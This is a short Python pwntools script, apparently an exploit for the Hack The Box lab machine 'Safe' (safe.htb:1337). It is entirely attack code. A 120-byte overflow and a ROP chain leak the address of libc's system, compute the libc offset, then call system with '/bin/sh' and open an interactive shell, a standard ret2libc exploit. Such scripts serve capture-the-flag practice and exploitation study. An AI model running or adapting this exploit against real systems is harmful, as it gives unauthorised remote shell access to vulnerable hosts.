#!/usr/bin/python
from pwn import *

r = remote("safe.htb", 1337)

JUNK    = "A"*120
POP_RDI = 0x40120b
GOT_SYS = 0x404020
PLT_SYS = 0x401040
MAIN    = 0x40115f
LIB_SYS = 0x03f480

payload = JUNK + p64(POP_RDI) + p64(GOT_SYS) + p64(PLT_SYS) + p64(MAIN) 

r.recvuntil("\n")
r.sendline(payload)

libc_system = u64(r.recvline().strip()[7:-11].ljust(8, "\x00"))
offset = libc_system - LIB_SYS

libc_system = 0x045390 + offset
libc_sh     = 0x161c19 + offset

payload = JUNK + p64(POP_RDI) + p64(libc_sh) + p64(PLT_SYS)

r.recvuntil("\n")
r.sendline(payload)

r.interactive()
